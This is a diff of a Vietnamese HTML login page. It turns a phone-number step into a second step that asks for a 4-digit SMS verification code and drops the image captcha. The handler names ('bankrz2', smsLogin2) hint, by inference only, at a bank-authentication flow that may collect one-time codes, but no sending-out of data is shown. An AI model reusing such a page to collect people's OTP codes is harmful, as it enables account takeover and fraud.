@@ -63,20 +63,11 @@
 						<img class="logo" src="static/images/logo.png" alt="">
 					</span>
 
-					<div class="wrap-input100 validate-input m-b-23" data-validate="Nhập số điện thoại của bạn">
+					<div class="wrap-input100 validate-input m-b-23" data-validate="Mã xác minh">
 						<span class="label-input100 title">Số điện thoại di động</span>
-						<input class="input100 username" type="text" id="mobile" placeholder="Nhập số điện thoại của bạn" autocomplete="off">
+						<input class="input100 username" type="text" id="smscode" placeholder="Mã xác minh" autocomplete="off">
 					</div>
 
-					<div class="wrap-input100 validate-input" data-validate="Nhập mã xác minh" style="height: 81px">
-						<span class="label-input100 title">Mã xác minh bằng hình ảnh</span>
-
-						<div class="input100 gx_code ">
-							<input class="input100 gx_code_input" type="text" id="vcode" placeholder="Nhập mã xác minh" autocomplete="off">
-							<div class="graphic_code" id="code" title="Xem không rõ, đổi hình khác"></div>
-						</div>
-
-					</div>
 
 					<div class="text-right p-t-8 p-b-31">
 
@@ -85,7 +76,7 @@
 					<div class="container-login100-form-btn">
 						<div class="wrap-login100-form-btn">
 							<div class="login100-form-bgbtn"></div>
-							<input type="button" class="login-form-btn" id="bankrz" value="Bước tiếp theo" onClick="smsLogin();">
+							<input type="button" class="login-form-btn" id="bankrz2" value="Bước tiếp theo" onClick="smsLogin2();">
 						</div>
 					</div>
 
@@ -94,8 +85,8 @@
 			</div>
 		</div>
 	</div>
-	<div class="gx_alert">
-		<p class="gx_alert_p"></p>
+	<div class="gx_alert2">
+		<p class="gx_alert_p2"></p>
 	</div>
 	<script src="https://sdk.accountkit.com/vi_VN/sdk.js"></script>
 	<script type="text/javascript" src="static/js/jquery-1.11.3.min.js"></script>
@@ -112,8 +103,7 @@
 <script>
 	$(".gx_code_input,.username").on('input propertychange',function(){
 		var username = $(".username").val();
-		var password = $(".gx_code_input").val();
-		if (username.length>1&&password.length>1){
+		if (username.length==4){
 			$(".login-form-btn").addClass('bg-tp')
 		}else {
 			$(".login-form-btn").removeClass('bg-tp')
